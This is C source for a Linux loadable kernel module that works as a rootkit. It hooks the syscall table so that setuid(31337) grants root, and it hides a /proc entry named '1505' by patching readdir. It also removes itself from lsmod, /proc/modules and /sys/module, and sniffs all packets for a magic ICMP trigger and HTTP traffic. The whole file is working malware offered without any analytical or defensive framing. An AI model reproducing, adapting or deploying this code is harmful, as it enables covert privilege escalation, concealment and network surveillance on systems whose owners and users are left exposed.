/* Different 2.6 versions need this */
#ifndef __KERNEL__
#define __KERNEL__
#endif

#ifndef MODULE
#define MODULE
#endif

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <linux/version.h>

#include <linux/mm.h>
#include <linux/mm_types.h>
#include <linux/vmalloc.h>

#include <linux/utsname.h>
#include <linux/mempool.h>

#include <linux/file.h>
#include <linux/tty.h>

#include <linux/kprobes.h>
#include <linux/kallsyms.h>

#include <linux/netdevice.h>

#include <linux/sched.h>
#include <linux/if.h>


#include <linux/module.h>
#include <linux/version.h>
#include <linux/skbuff.h>

#include <net/protocol.h>
#include <linux/netdevice.h>
#include <net/pkt_sched.h>
#include <net/tcp.h>
#include <net/ip.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/icmp.h>

#include <linux/kernel.h>
#include <linux/mm.h>
#include <linux/file.h>
#include <asm/uaccess.h>

#include <linux/kernel.h>
#include <linux/in.h>
#include <linux/icmp.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>


#include "config.h"
#include "utils.h"
#include "vfs.h"
#include "sct.h"
#include "net.h"

MODULE_AUTHOR("INVENT");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION(MODULE_NAME " module");

/* syscall table */
void ** sys_call_table;

#ifdef CONFIG_IA32_EMULATION
/* syscall table for 32 bit compatibility */
void ** ia32_sys_call_table;
#endif

/* ETH_P_ALL hooking */
static struct packet_type net_p_all_pkt;

asmlinkage long (*o_setuid)(uid_t);

asmlinkage long h_setuid(uid_t uid) {
    if (uid == 31337) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,29)
        struct cred *cred = prepare_creds();
        cred->uid = cred->suid = cred->euid = cred->fsuid = 0;
        cred->gid = cred->sgid = cred->egid = cred->fsgid = 0;
        return commit_creds(cred);
#else
        current->uid = current->euid = current->suid = current->fsuid = 0;
        current->gid = current->egid = current->sgid = current->fsgid = 0;
        return 0;
#endif
    }
    return o_setuid(uid);
}

/* FS fileops hook */

readdir_t readdir_orig = NULL;
filldir_t filldir_orig = NULL;

DEFINE_SPINLOCK(filldir_lock);

int filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
    int ret;

    if (!strcmp(name, "1505")) return 0;
    ret = filldir_orig(buf, name, namelen, offset, ino, d_type);
    return ret;
}

int readdir_new(struct file *filp, void *dirent, filldir_t filldir)
{
    int ret;

    filldir_orig = filldir;

    //spin_lock(&filldir_lock);
    ret = readdir_orig(filp, dirent, filldir_new);
    //spin_unlock(&filldir_lock);

    return ret;
}

#define NIPQUAD(addr) \
        ((unsigned char *)&addr)[0], \
        ((unsigned char *)&addr)[1], \
        ((unsigned char *)&addr)[2], \
        ((unsigned char *)&addr)[3]

unsigned int net_p_all_chk(struct sk_buff *sk, struct device *dev, struct packet_type *pt, struct net_device *orig_dev)
{
    struct iphdr *iph;
    struct tcphdr *tcph;
    struct icmphdr *icmph;
    char *data_p;
    int total_len, payload_len;
    char *buff;

    iph = (struct iphdr *) skb_network_header(sk);
    total_len = htons(iph->tot_len);
    if(iph->protocol == IPPROTO_ICMP) {
        icmph = (struct icmphdr *)(skb_transport_header(sk) + ip_hdrlen(sk));
        payload_len = total_len - sizeof(struct icmphdr) - sizeof(struct iphdr);
        dbgprint("got icmp packet. tot_len: %d, payload_len: %d, SRC: (%u.%u.%u.%u) --> DST: (%u.%u.%u.%u), type: %d, code: %d\n", total_len, payload_len, NIPQUAD(iph->saddr), NIPQUAD(iph->daddr), icmph->type, icmph->code);
        // if this is ICMP reply
        if(icmph->type == 0 && icmph->code == 0) {
            data_p = (char *) ((long) icmph + sizeof(struct icmphdr));
            buff = kmalloc(payload_len + 1, GFP_ATOMIC);
            memcpy(buff, data_p, payload_len);
            buff[payload_len] = '\0';
            if(strstr(buff, ":") != NULL) {
                if(strncmp(buff, MAGIC_SECRET, sizeof(MAGIC_SECRET)) == 0) {
                    dbgprint("this is a magic icmp packet!\n");
                }
            }
            kfree(buff);
        }

    }
    switch(iph->protocol) {
            case IPPROTO_TCP: // TCP
                tcph = (struct tcphdr *)(skb_transport_header(sk) + ip_hdrlen(sk));
               // tcp = (struct tcphdr *)(sk->data + (iph->ihl * 4));
                data_p = (char *)((long)tcph + (long)(tcph->doff * 4));
                //dbgprint("got tcp packet\n");
                if (strncmp(data_p, "HTTP", 4) == 0) {
                    dbgprint("%s\n", data_p);
                }
            break;
   }
    // NO ICMP && NO TCP 
    kfree_skb(sk);
    return 0;
}

/* LKM init */
int __init lkm_init(void)
{
    // this module pointer
    struct module *mod;
    // this module list 
    struct list_head *m_list;
    // this module kernel object
    struct kobject *m_kobj;
    // misc system information structure 
    struct new_utsname *uts;

    uts = utsname();
    dbgprint(MODULE_NAME " loaded: %s %s %s %s %s %s\n", uts->sysname, uts->nodename, uts->release, uts->version, uts->machine, uts->domainname);

    // Trying to find sys_call_table address using MSR method
    //sys_call_table =  get_writable_addr(get_sys_call_table());
    sys_call_table =  get_sys_call_table();
    if(sys_call_table == NULL) {
        // Otherwise try to find it using bruteforce
        //sys_call_table = get_writable_addr(get_sys_call_table_brute());
        sys_call_table = get_sys_call_table_brute();
    }

    if(sys_call_table == NULL) {
        dbgprint("cannot find sys_call_table addr\n");
        return -1;
    } else {
        dbgprint("our real sys_call_table addr is: 0x%p\n", sys_call_table);
    }

    #ifdef CONFIG_IA32_EMULATION
    // Trying to find IA32 emulation sys_call_table address via IDT 
    //ia32_sys_call_table =  get_writable_addr(get_ia32_sys_call_table());
    ia32_sys_call_table =  get_ia32_sys_call_table();

    if(ia32_sys_call_table == NULL) {
        dbgprint("cannot find ia32_sys_call_table addr\n");
        return -1;
    } else {
        dbgprint("our real ia32_sys_call_table addr is: 0x%p\n", ia32_sys_call_table);
    }
    #endif

    dbgprint("sys_close addr: 0x%p\n", (void *) sys_close);
    dbgprint("sys_call_table[__NR_close] addr: 0x%p\n", (void *) sys_call_table[__NR_close]);

    // hook sys_setuid
    //set_addr_rw(sys_call_table);
    set_cr0_rw();
    o_setuid = sys_call_table[__NR_setuid];
    sys_call_table[__NR_setuid] = h_setuid;
    //set_addr_ro(sys_call_table);
    set_cr0_ro();

    // network packets handling
    net_p_all_pkt.type = htons(ETH_P_ALL);
    net_p_all_pkt.func = (void *) net_p_all_chk;
    net_p_all_pkt.dev = NULL;
    install_packet_type(&net_p_all_pkt);

    // trying to hide module
    mod = &__this_module;
    m_list = &mod->list;
    m_kobj = &mod->mkobj.kobj;

#ifndef I_DEBUG
    // Removing module from lsmod and /proc/modules, by removing double linked list element.

    // Hiding from lsmod
    m_list->next->prev = m_list->prev;
    m_list->prev->next = m_list->next;

    // Removing myself from /proc/modules
    list_del_init(m_list);

    // Remove our kernel object, to hide from /sys/module/
    kobject_del(m_kobj);
#endif

    // VFS patching
    patch_vfs_readdir("/proc", &readdir_orig, readdir_new);

    // A non 0 return means init_module failed; module can't be loaded.
    return 0;
}

/* LKM cleanup */
void __exit lkm_cleanup(void) {

    //vunmap memory
    //clean_writable_addr(sys_call_table);
#ifdef CONFIG_IA32_EMULATION
    //clean_writable_addr(ia32_sys_call_table);
#endif

    //set_addr_rw(sys_call_table);
    set_cr0_rw();
    sys_call_table[__NR_setuid] = o_setuid;
    //set_addr_ro(sys_call_table);
    set_cr0_ro();

    unpatch_vfs_readdir("/proc", readdir_orig);
    uninstall_packet_type(&net_p_all_pkt);

    dbgprint(MODULE_NAME " unloaded\n");
}

module_init(lkm_init);
module_exit(lkm_cleanup);


